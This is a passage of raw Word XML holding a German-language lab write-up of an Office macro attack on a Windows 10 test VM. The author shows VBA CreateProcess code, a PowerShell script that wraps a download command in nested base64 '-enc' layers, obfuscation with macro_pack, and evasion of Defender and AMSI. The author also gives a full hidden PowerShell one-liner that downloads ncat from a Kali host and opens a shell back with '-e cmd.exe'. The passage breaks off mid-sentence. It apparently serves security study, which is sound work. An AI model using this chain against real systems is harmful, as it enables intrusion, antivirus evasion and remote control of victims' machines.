          <w:p w14:paraId="0A790D8C" w14:textId="77777777" w:rsidR="000E60E5" w:rsidRPr="000E60E5" w:rsidRDefault="000E60E5" w:rsidP="000E60E5">
            <w:pPr>
              <w:rPr>
                <w:lang w:val="en-NZ"/>
              </w:rPr>
            </w:pPr>
          </w:p>
          <w:p w14:paraId="610958DF" w14:textId="77777777" w:rsidR="000E60E5" w:rsidRPr="000E60E5" w:rsidRDefault="000E60E5" w:rsidP="000E60E5">
            <w:pPr>
              <w:rPr>
                <w:lang w:val="en-NZ"/>
              </w:rPr>
            </w:pPr>
          </w:p>
          <w:p w14:paraId="3EA358E0" w14:textId="77777777" w:rsidR="000E60E5" w:rsidRPr="000E60E5" w:rsidRDefault="000E60E5" w:rsidP="000E60E5">
            <w:pPr>
              <w:rPr>
                <w:lang w:val="en-NZ"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="000E60E5">
              <w:rPr>
                <w:lang w:val="en-NZ"/>
              </w:rPr>
              <w:t>lSuccess = CreateProcess(sNull, "calc.exe", ByVal 0&amp;, ByVal 0&amp;, 1&amp;, CREATE_NEW_CONSOLE, ByVal 0&amp;, sNull, sInfo, pInfo)</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="1B955880" w14:textId="77777777" w:rsidR="000E60E5" w:rsidRPr="000E60E5" w:rsidRDefault="000E60E5" w:rsidP="000E60E5">
            <w:pPr>
              <w:rPr>
                <w:lang w:val="en-NZ"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="000E60E5">
              <w:rPr>
                <w:lang w:val="en-NZ"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="4B70F925" w14:textId="77777777" w:rsidR="000E60E5" w:rsidRPr="000E60E5" w:rsidRDefault="000E60E5" w:rsidP="000E60E5">
            <w:pPr>
              <w:rPr>
                <w:lang w:val="en-NZ"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="000E60E5">
              <w:rPr>
                <w:lang w:val="en-NZ"/>
              </w:rPr>
              <w:t>lRetValue = CloseHandle(pInfo.hThread)</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="4812E7B1" w14:textId="77777777" w:rsidR="000E60E5" w:rsidRPr="000E60E5" w:rsidRDefault="000E60E5" w:rsidP="000E60E5">
            <w:pPr>
              <w:rPr>
                <w:lang w:val="en-NZ"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="000E60E5">
              <w:rPr>
                <w:lang w:val="en-NZ"/>
              </w:rPr>
              <w:t>lRetValue = CloseHandle(pInfo.hProcess)</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="184F56AE" w14:textId="77777777" w:rsidR="000E60E5" w:rsidRPr="000E60E5" w:rsidRDefault="000E60E5" w:rsidP="000E60E5">
            <w:pPr>
              <w:rPr>
                <w:lang w:val="en-NZ"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="000E60E5">
              <w:rPr>
                <w:lang w:val="en-NZ"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="2F701E3B" w14:textId="36BD21D6" w:rsidR="000E60E5" w:rsidRDefault="000E60E5" w:rsidP="000E60E5">
            <w:pPr>
              <w:rPr>
                <w:lang w:val="de-AT"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="000E60E5">
              <w:rPr>
                <w:lang w:val="de-AT"/>
              </w:rPr>
              <w:t>End Sub</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
    </w:tbl>
    <w:p w14:paraId="47AA8F56" w14:textId="77777777" w:rsidR="000E60E5" w:rsidRDefault="000E60E5" w:rsidP="0084189E">
      <w:pPr>
        <w:rPr>
          <w:lang w:val="de-AT"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="10978FA8" w14:textId="4106FD5E" w:rsidR="006A67A9" w:rsidRDefault="00EF2BC2" w:rsidP="0084189E">
      <w:pPr>
        <w:rPr>
          <w:lang w:val="de-AT"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:lang w:val="de-AT"/>
        </w:rPr>
        <w:t>Als nächstes wollte ich einfach mal schauen, ob das</w:t>
      </w:r>
      <w:r w:rsidR="00114F1E">
        <w:rPr>
          <w:lang w:val="de-AT"/>
        </w:rPr>
        <w:t xml:space="preserve"> so funktioniert wie ich es mir denke.</w:t>
      </w:r>
      <w:r w:rsidR="006A67A9">
        <w:rPr>
          <w:lang w:val="de-AT"/>
        </w:rPr>
        <w:t xml:space="preserve"> Daher war mein Ziel mithilfe des Befehls „</w:t>
      </w:r>
      <w:r w:rsidR="006A67A9" w:rsidRPr="006A67A9">
        <w:rPr>
          <w:lang w:val="de-AT"/>
        </w:rPr>
        <w:t>powershell Invoke-WebRequest http://10.0.2.11:8000/test.txt -OutFile C:\test.txt;</w:t>
      </w:r>
      <w:r w:rsidR="006A67A9">
        <w:rPr>
          <w:lang w:val="de-AT"/>
        </w:rPr>
        <w:t xml:space="preserve">“ </w:t>
      </w:r>
      <w:r w:rsidR="006808D9">
        <w:rPr>
          <w:lang w:val="de-AT"/>
        </w:rPr>
        <w:t xml:space="preserve">von meinem http Server, welchen ich auf Kali mit „python -m SimpleHttpServer“ gestartet habe ein Textfile herunterladen. Da im Blog ja erwähnt wurde, dass </w:t>
      </w:r>
      <w:r w:rsidR="00BA3C25">
        <w:rPr>
          <w:lang w:val="de-AT"/>
        </w:rPr>
        <w:t>man den Inhalt Base64 Encodieren soll schrieb ich mir ein kleines Powershell Skript:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4432DEFB" w14:textId="6EA1293C" w:rsidR="00BA3C25" w:rsidRDefault="00BA3C25" w:rsidP="0084189E">
      <w:pPr>
        <w:rPr>
          <w:lang w:val="de-AT"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:tbl>
      <w:tblPr>
        <w:tblStyle w:val="Tabellenraster"/>
        <w:tblW w:w="0" w:type="auto"/>
        <w:tblLook w:val="04A0" w:firstRow="1" w:lastRow="0" w:firstColumn="1" w:lastColumn="0" w:noHBand="0" w:noVBand="1"/>
      </w:tblPr>
      <w:tblGrid>
        <w:gridCol w:w="9060"/>
      </w:tblGrid>
      <w:tr w:rsidR="00CC076C" w:rsidRPr="00866A18" w14:paraId="1145DA57" w14:textId="77777777" w:rsidTr="00CC076C">
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="9060" w:type="dxa"/>
          </w:tcPr>
          <w:p w14:paraId="56D4BD8E" w14:textId="77777777" w:rsidR="00832CC9" w:rsidRPr="00832CC9" w:rsidRDefault="00832CC9" w:rsidP="00832CC9">
            <w:pPr>
              <w:rPr>
                <w:lang w:val="en-NZ"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="00832CC9">
              <w:rPr>
                <w:lang w:val="en-NZ"/>
              </w:rPr>
              <w:t>echo 1</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="3A78E001" w14:textId="77777777" w:rsidR="00832CC9" w:rsidRPr="00832CC9" w:rsidRDefault="00832CC9" w:rsidP="00832CC9">
            <w:pPr>
              <w:rPr>
                <w:lang w:val="en-NZ"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="00832CC9">
              <w:rPr>
                <w:lang w:val="en-NZ"/>
              </w:rPr>
              <w:t>$command1_1 = "powershell Invoke-WebRequest http://10.0.2.11:8000/test.txt -OutFile C:\test.txt;"</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="4A366406" w14:textId="77777777" w:rsidR="00832CC9" w:rsidRPr="00832CC9" w:rsidRDefault="00832CC9" w:rsidP="00832CC9">
            <w:pPr>
              <w:rPr>
                <w:lang w:val="en-NZ"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="00832CC9">
              <w:rPr>
                <w:lang w:val="en-NZ"/>
              </w:rPr>
              <w:t>$command1_2 = [Convert]::ToBase64String([Text.Encoding]::Unicode.GetBytes($command1_1))</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="23A815F8" w14:textId="77777777" w:rsidR="00832CC9" w:rsidRPr="00832CC9" w:rsidRDefault="00832CC9" w:rsidP="00832CC9">
            <w:pPr>
              <w:rPr>
                <w:lang w:val="en-NZ"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="00832CC9">
              <w:rPr>
                <w:lang w:val="en-NZ"/>
              </w:rPr>
              <w:t>[Convert]::ToBase64String([Text.Encoding]::Unicode.GetBytes($command1_1))</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="025F9221" w14:textId="77777777" w:rsidR="00832CC9" w:rsidRPr="00832CC9" w:rsidRDefault="00832CC9" w:rsidP="00832CC9">
            <w:pPr>
              <w:rPr>
                <w:lang w:val="en-NZ"/>
              </w:rPr>
            </w:pPr>
          </w:p>
          <w:p w14:paraId="2775B6F5" w14:textId="77777777" w:rsidR="00832CC9" w:rsidRPr="00832CC9" w:rsidRDefault="00832CC9" w:rsidP="00832CC9">
            <w:pPr>
              <w:rPr>
                <w:lang w:val="en-NZ"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="00832CC9">
              <w:rPr>
                <w:lang w:val="en-NZ"/>
              </w:rPr>
              <w:t>echo 2</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="69F8ACF8" w14:textId="77777777" w:rsidR="00832CC9" w:rsidRPr="00832CC9" w:rsidRDefault="00832CC9" w:rsidP="00832CC9">
            <w:pPr>
              <w:rPr>
                <w:lang w:val="en-NZ"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="00832CC9">
              <w:rPr>
                <w:lang w:val="en-NZ"/>
              </w:rPr>
              <w:t>$command2_1 = "powershell.exe -enc "  + $command1_2</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="0410A061" w14:textId="77777777" w:rsidR="00832CC9" w:rsidRPr="00832CC9" w:rsidRDefault="00832CC9" w:rsidP="00832CC9">
            <w:pPr>
              <w:rPr>
                <w:lang w:val="en-NZ"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="00832CC9">
              <w:rPr>
                <w:lang w:val="en-NZ"/>
              </w:rPr>
              <w:t>$command2_2 = [Convert]::ToBase64String([Text.Encoding]::Unicode.GetBytes($command2_1))</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="0CE56D80" w14:textId="77777777" w:rsidR="00832CC9" w:rsidRPr="00832CC9" w:rsidRDefault="00832CC9" w:rsidP="00832CC9">
            <w:pPr>
              <w:rPr>
                <w:lang w:val="en-NZ"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="00832CC9">
              <w:rPr>
                <w:lang w:val="en-NZ"/>
              </w:rPr>
              <w:t>[Convert]::ToBase64String([Text.Encoding]::Unicode.GetBytes($command2_1))</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="58A68D2F" w14:textId="77777777" w:rsidR="00832CC9" w:rsidRPr="00832CC9" w:rsidRDefault="00832CC9" w:rsidP="00832CC9">
            <w:pPr>
              <w:rPr>
                <w:lang w:val="en-NZ"/>
              </w:rPr>
            </w:pPr>
          </w:p>
          <w:p w14:paraId="08831B12" w14:textId="77777777" w:rsidR="00832CC9" w:rsidRPr="00832CC9" w:rsidRDefault="00832CC9" w:rsidP="00832CC9">
            <w:pPr>
              <w:rPr>
                <w:lang w:val="en-NZ"/>
              </w:rPr>
            </w:pPr>
          </w:p>
          <w:p w14:paraId="28B23099" w14:textId="77777777" w:rsidR="00832CC9" w:rsidRPr="00832CC9" w:rsidRDefault="00832CC9" w:rsidP="00832CC9">
            <w:pPr>
              <w:rPr>
                <w:lang w:val="en-NZ"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="00832CC9">
              <w:rPr>
                <w:lang w:val="en-NZ"/>
              </w:rPr>
              <w:t>echo 3</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="56FF13C1" w14:textId="77777777" w:rsidR="00832CC9" w:rsidRPr="00832CC9" w:rsidRDefault="00832CC9" w:rsidP="00832CC9">
            <w:pPr>
              <w:rPr>
                <w:lang w:val="en-NZ"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="00832CC9">
              <w:rPr>
                <w:lang w:val="en-NZ"/>
              </w:rPr>
              <w:t>$command3_1 = "powershell.exe -enc "  + $command2_2</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="12A5B978" w14:textId="77777777" w:rsidR="00832CC9" w:rsidRPr="00832CC9" w:rsidRDefault="00832CC9" w:rsidP="00832CC9">
            <w:pPr>
              <w:rPr>
                <w:lang w:val="en-NZ"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="00832CC9">
              <w:rPr>
                <w:lang w:val="en-NZ"/>
              </w:rPr>
              <w:t>$command3_2 = [Convert]::ToBase64String([Text.Encoding]::Unicode.GetBytes($command3_1))</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="4AD966B4" w14:textId="7AC8E8B6" w:rsidR="00CC076C" w:rsidRDefault="00832CC9" w:rsidP="00832CC9">
            <w:pPr>
              <w:rPr>
                <w:lang w:val="en-NZ"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="00832CC9">
              <w:rPr>
                <w:lang w:val="en-NZ"/>
              </w:rPr>
              <w:t>[Convert]::ToBase64String([Text.Encoding]::Unicode.GetBytes($command3_1))</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="007D5F25" w:rsidRPr="00866A18" w14:paraId="50EE255D" w14:textId="77777777" w:rsidTr="00CC076C">
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="9060" w:type="dxa"/>
          </w:tcPr>
          <w:p w14:paraId="01F28BE9" w14:textId="545DF3CE" w:rsidR="007D5F25" w:rsidRPr="00832CC9" w:rsidRDefault="007D5F25" w:rsidP="00832CC9">
            <w:pPr>
              <w:rPr>
                <w:lang w:val="en-NZ"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="007D5F25">
              <w:rPr>
                <w:lang w:val="en-NZ"/>
              </w:rPr>
              <w:t>encoding_1.ps1</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
    </w:tbl>
    <w:p w14:paraId="37B7CBC6" w14:textId="1572C0CB" w:rsidR="00BA3C25" w:rsidRDefault="00BA3C25" w:rsidP="0084189E">
      <w:pPr>
        <w:rPr>
          <w:lang w:val="en-NZ"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="6E5AF71F" w14:textId="4BB0515C" w:rsidR="00CC076C" w:rsidRPr="00CC076C" w:rsidRDefault="00CC076C" w:rsidP="0084189E">
      <w:pPr>
        <w:rPr>
          <w:lang w:val="de-AT"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00CC076C">
        <w:rPr>
          <w:lang w:val="de-AT"/>
        </w:rPr>
        <w:t>Ergebnis auf der Konsole (s</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:lang w:val="de-AT"/>
        </w:rPr>
        <w:t>iehe Abbildung).</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7D2F39C9" w14:textId="37771CB6" w:rsidR="00114F1E" w:rsidRDefault="000B63F3" w:rsidP="0084189E">
      <w:pPr>
        <w:rPr>
          <w:lang w:val="de-AT"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:noProof/>
        </w:rPr>
        <w:drawing>
          <wp:inline distT="0" distB="0" distL="0" distR="0" wp14:anchorId="6F954210" wp14:editId="27F61D86">
            <wp:extent cx="5759450" cy="2225040"/>
            <wp:effectExtent l="0" t="0" r="0" b="3810"/>
            <wp:docPr id="135" name="Grafik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59450" cy="2225040"/>
                    </a:xfrm>
                    <a:prstGeom prst="rect">
                      <a:avLst/>
                    </a:prstGeom>
                  </pic:spPr>
                </pic:pic>
              </a:graphicData>
            </a:graphic>
          </wp:inline>
        </w:drawing>
      </w:r>
    </w:p>
    <w:p w14:paraId="0C42EAA9" w14:textId="27D75F78" w:rsidR="00610B47" w:rsidRDefault="00610B47" w:rsidP="0084189E">
      <w:pPr>
        <w:rPr>
          <w:lang w:val="de-AT"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="0C764481" w14:textId="5A0BC0A9" w:rsidR="000B63F3" w:rsidRDefault="00EB2DD3" w:rsidP="0084189E">
      <w:pPr>
        <w:rPr>
          <w:lang w:val="de-AT"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:lang w:val="de-AT"/>
        </w:rPr>
        <w:t>Das</w:t>
      </w:r>
      <w:r w:rsidR="006D43EB">
        <w:rPr>
          <w:lang w:val="de-AT"/>
        </w:rPr>
        <w:t xml:space="preserve"> Encoding fügte ich anschließend in die Funktion CallMe ein und obfuskierte das VBA Skript </w:t>
      </w:r>
      <w:r w:rsidR="000B6CC9">
        <w:rPr>
          <w:lang w:val="de-AT"/>
        </w:rPr>
        <w:t>mit:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0FEAFDA5" w14:textId="77777777" w:rsidR="000B6CC9" w:rsidRDefault="000B6CC9" w:rsidP="0084189E">
      <w:pPr>
        <w:rPr>
          <w:lang w:val="de-AT"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="1DDA4427" w14:textId="5984E32B" w:rsidR="000B6CC9" w:rsidRPr="000B6CC9" w:rsidRDefault="000B6CC9" w:rsidP="000B6CC9">
      <w:pPr>
        <w:pStyle w:val="Listenabsatz"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="42"/>
        </w:numPr>
        <w:rPr>
          <w:lang w:val="en-NZ"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="000B6CC9">
        <w:rPr>
          <w:lang w:val="en-NZ"/>
        </w:rPr>
        <w:t>python macro_pack.py -f ./cleartext/test15.vba -o -G ./obfuscated/test15_obf.vba</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="34C7622B" w14:textId="70323F25" w:rsidR="000B63F3" w:rsidRDefault="000B63F3" w:rsidP="0084189E">
      <w:pPr>
        <w:rPr>
          <w:lang w:val="en-NZ"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="52AD6161" w14:textId="7724FCBA" w:rsidR="00B252BE" w:rsidRDefault="00B252BE" w:rsidP="0084189E">
      <w:pPr>
        <w:rPr>
          <w:lang w:val="en-NZ"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:lang w:val="en-NZ"/>
        </w:rPr>
        <w:t>Davor:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2AB9366C" w14:textId="15722DC7" w:rsidR="000B6CC9" w:rsidRPr="000B6CC9" w:rsidRDefault="00B252BE" w:rsidP="0084189E">
      <w:pPr>
        <w:rPr>
          <w:lang w:val="en-NZ"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:noProof/>
        </w:rPr>
        <w:drawing>
          <wp:inline distT="0" distB="0" distL="0" distR="0" wp14:anchorId="5852D627" wp14:editId="521D0187">
            <wp:extent cx="4154994" cy="1223593"/>
            <wp:effectExtent l="0" t="0" r="0" b="0"/>
            <wp:docPr id="136" name="Grafik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164201" cy="1226304"/>
                    </a:xfrm>
                    <a:prstGeom prst="rect">
                      <a:avLst/>
                    </a:prstGeom>
                  </pic:spPr>
                </pic:pic>
              </a:graphicData>
            </a:graphic>
          </wp:inline>
        </w:drawing>
      </w:r>
    </w:p>
    <w:p w14:paraId="57ACE88B" w14:textId="08391841" w:rsidR="00B252BE" w:rsidRDefault="00B252BE" w:rsidP="0084189E">
      <w:pPr>
        <w:rPr>
          <w:lang w:val="en-NZ"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:lang w:val="en-NZ"/>
        </w:rPr>
        <w:t>Danach:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3A6D04E6" w14:textId="45CA4980" w:rsidR="00B252BE" w:rsidRDefault="00B252BE" w:rsidP="0084189E">
      <w:pPr>
        <w:rPr>
          <w:lang w:val="en-NZ"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:noProof/>
        </w:rPr>
        <w:drawing>
          <wp:inline distT="0" distB="0" distL="0" distR="0" wp14:anchorId="4E94A954" wp14:editId="621E770E">
            <wp:extent cx="5759450" cy="1436370"/>
            <wp:effectExtent l="0" t="0" r="0" b="0"/>
            <wp:docPr id="137" name="Grafik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59450" cy="1436370"/>
                    </a:xfrm>
                    <a:prstGeom prst="rect">
                      <a:avLst/>
                    </a:prstGeom>
                  </pic:spPr>
                </pic:pic>
              </a:graphicData>
            </a:graphic>
          </wp:inline>
        </w:drawing>
      </w:r>
    </w:p>
    <w:p w14:paraId="7C727F2D" w14:textId="589F1CE0" w:rsidR="00B252BE" w:rsidRDefault="00B252BE" w:rsidP="0084189E">
      <w:pPr>
        <w:rPr>
          <w:lang w:val="en-NZ"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="6B239D6E" w14:textId="1546924E" w:rsidR="00B252BE" w:rsidRDefault="00B252BE" w:rsidP="0084189E">
      <w:pPr>
        <w:rPr>
          <w:lang w:val="de-AT"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00B252BE">
        <w:rPr>
          <w:lang w:val="de-AT"/>
        </w:rPr>
        <w:t xml:space="preserve">Ich aktivierte den Windows </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:lang w:val="de-AT"/>
        </w:rPr>
        <w:t>Defender, kopierte die Datei auf eine separate Win</w:t>
      </w:r>
      <w:r w:rsidR="007D5F25">
        <w:rPr>
          <w:lang w:val="de-AT"/>
        </w:rPr>
        <w:t>dows</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:lang w:val="de-AT"/>
        </w:rPr>
        <w:t xml:space="preserve"> 10 VM und führte sie aus und siehe da: </w:t>
      </w:r>
      <w:r w:rsidR="00557E31">
        <w:rPr>
          <w:lang w:val="de-AT"/>
        </w:rPr>
        <w:t>Test.txt ist auf dem C Verzeichnis.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6C0DCD93" w14:textId="689482C7" w:rsidR="00EB4E8A" w:rsidRDefault="00EB4E8A" w:rsidP="0084189E">
      <w:pPr>
        <w:rPr>
          <w:lang w:val="de-AT"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="2469E83B" w14:textId="78CC5225" w:rsidR="00EB4E8A" w:rsidRPr="00B252BE" w:rsidRDefault="00EB4E8A" w:rsidP="0084189E">
      <w:pPr>
        <w:rPr>
          <w:lang w:val="de-AT"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:noProof/>
        </w:rPr>
        <w:drawing>
          <wp:inline distT="0" distB="0" distL="0" distR="0" wp14:anchorId="51784097" wp14:editId="57E81B3B">
            <wp:extent cx="5759450" cy="2192020"/>
            <wp:effectExtent l="0" t="0" r="0" b="0"/>
            <wp:docPr id="138" name="Grafik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59450" cy="2192020"/>
                    </a:xfrm>
                    <a:prstGeom prst="rect">
                      <a:avLst/>
                    </a:prstGeom>
                  </pic:spPr>
                </pic:pic>
              </a:graphicData>
            </a:graphic>
          </wp:inline>
        </w:drawing>
      </w:r>
    </w:p>
    <w:p w14:paraId="18FD4430" w14:textId="43406D96" w:rsidR="00B252BE" w:rsidRDefault="00B252BE" w:rsidP="0084189E">
      <w:pPr>
        <w:rPr>
          <w:lang w:val="de-AT"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="24FB1D53" w14:textId="6C5F4406" w:rsidR="004077BE" w:rsidRDefault="001F397E" w:rsidP="0084189E">
      <w:pPr>
        <w:rPr>
          <w:lang w:val="de-AT"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:lang w:val="de-AT"/>
        </w:rPr>
        <w:t xml:space="preserve">Der nächste Schritt war die C2 Verbindung mit Bind Shell. </w:t>
      </w:r>
      <w:r w:rsidR="00CD66B8">
        <w:rPr>
          <w:lang w:val="de-AT"/>
        </w:rPr>
        <w:t xml:space="preserve">Ich </w:t>
      </w:r>
      <w:r w:rsidR="00081225">
        <w:rPr>
          <w:lang w:val="de-AT"/>
        </w:rPr>
        <w:t xml:space="preserve">probierte zuerst nc64 auf das Zielsystem zu laden und auszuführen. </w:t>
      </w:r>
      <w:r w:rsidR="00B16AFF">
        <w:rPr>
          <w:lang w:val="de-AT"/>
        </w:rPr>
        <w:t>Da kam mir aber dann noch AMSI dazwischen</w:t>
      </w:r>
      <w:r w:rsidR="00C21023">
        <w:rPr>
          <w:lang w:val="de-AT"/>
        </w:rPr>
        <w:t xml:space="preserve"> (beim Versuch die Datei auszuführen)</w:t>
      </w:r>
      <w:r w:rsidR="00B16AFF">
        <w:rPr>
          <w:lang w:val="de-AT"/>
        </w:rPr>
        <w:t xml:space="preserve">. Also probierte ich die Portable Version, was </w:t>
      </w:r>
      <w:r w:rsidR="008E3B7E">
        <w:rPr>
          <w:lang w:val="de-AT"/>
        </w:rPr>
        <w:t>zu funktionieren schien</w:t>
      </w:r>
      <w:r w:rsidR="00137243">
        <w:rPr>
          <w:lang w:val="de-AT"/>
        </w:rPr>
        <w:t xml:space="preserve"> (</w:t>
      </w:r>
      <w:r w:rsidR="00137243" w:rsidRPr="00137243">
        <w:rPr>
          <w:lang w:val="de-AT"/>
        </w:rPr>
        <w:t>https://github.com/cyberisltd/NcatPortable</w:t>
      </w:r>
      <w:r w:rsidR="00137243">
        <w:rPr>
          <w:lang w:val="de-AT"/>
        </w:rPr>
        <w:t>)</w:t>
      </w:r>
      <w:r w:rsidR="008E3B7E">
        <w:rPr>
          <w:lang w:val="de-AT"/>
        </w:rPr>
        <w:t xml:space="preserve">. </w:t>
      </w:r>
      <w:r w:rsidR="00137243">
        <w:rPr>
          <w:lang w:val="de-AT"/>
        </w:rPr>
        <w:t>D</w:t>
      </w:r>
      <w:r w:rsidR="0050410E">
        <w:rPr>
          <w:lang w:val="de-AT"/>
        </w:rPr>
        <w:t xml:space="preserve">ie Exe Datei wurde in den Ordner my.zip verpackt und </w:t>
      </w:r>
      <w:r w:rsidR="004077BE">
        <w:rPr>
          <w:lang w:val="de-AT"/>
        </w:rPr>
        <w:t>ein http Server auf Kali eingerichtet</w:t>
      </w:r>
      <w:r w:rsidR="00482EE0">
        <w:rPr>
          <w:lang w:val="de-AT"/>
        </w:rPr>
        <w:t xml:space="preserve"> (siehe Abbildung).</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2AA0B7EF" w14:textId="1F9B9460" w:rsidR="00482EE0" w:rsidRDefault="00482EE0" w:rsidP="0084189E">
      <w:pPr>
        <w:rPr>
          <w:lang w:val="de-AT"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:noProof/>
        </w:rPr>
        <w:drawing>
          <wp:inline distT="0" distB="0" distL="0" distR="0" wp14:anchorId="6701E4F6" wp14:editId="6B20E19E">
            <wp:extent cx="2793442" cy="1112708"/>
            <wp:effectExtent l="0" t="0" r="6985" b="0"/>
            <wp:docPr id="142" name="Grafik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808211" cy="1118591"/>
                    </a:xfrm>
                    <a:prstGeom prst="rect">
                      <a:avLst/>
                    </a:prstGeom>
                  </pic:spPr>
                </pic:pic>
              </a:graphicData>
            </a:graphic>
          </wp:inline>
        </w:drawing>
      </w:r>
    </w:p>
    <w:p w14:paraId="2E97EAFC" w14:textId="77777777" w:rsidR="00482EE0" w:rsidRDefault="00482EE0" w:rsidP="0084189E">
      <w:pPr>
        <w:rPr>
          <w:lang w:val="de-AT"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="328BEF48" w14:textId="0C2DDFD0" w:rsidR="004077BE" w:rsidRDefault="00482EE0" w:rsidP="0084189E">
      <w:pPr>
        <w:rPr>
          <w:lang w:val="de-AT"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:lang w:val="de-AT"/>
        </w:rPr>
        <w:t>Anschließend änderte</w:t>
      </w:r>
      <w:r w:rsidR="00162DF2">
        <w:rPr>
          <w:lang w:val="de-AT"/>
        </w:rPr>
        <w:t xml:space="preserve"> ich den Befehl nach dem AMSI Bypass in folgenden um:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="56EFE509" w14:textId="3B9EFDE8" w:rsidR="00162DF2" w:rsidRPr="00162DF2" w:rsidRDefault="00162DF2" w:rsidP="00162DF2">
      <w:pPr>
        <w:pStyle w:val="Listenabsatz"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="42"/>
        </w:numPr>
        <w:rPr>
          <w:lang w:val="en-NZ"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00162DF2">
        <w:rPr>
          <w:lang w:val="en-NZ"/>
        </w:rPr>
        <w:t>powershell -windowstyle hidden Invoke-WebRequest http://10.0.2.11:8000/my.zip -OutFile C:\my.zip;Expand-Archive -Path C:\my.zip -DestinationPath C:/my; rm C:\my.zip; C:\my\ncat.exe -nv 10.0.2.11 5555 -e cmd.exe</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="59633252" w14:textId="4863F9C9" w:rsidR="008E3B7E" w:rsidRDefault="007D4934" w:rsidP="0084189E">
      <w:pPr>
        <w:rPr>
          <w:lang w:val="de-AT"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00023C8D">
        <w:rPr>
          <w:lang w:val="de-AT"/>
        </w:rPr>
        <w:t xml:space="preserve">Und </w:t>
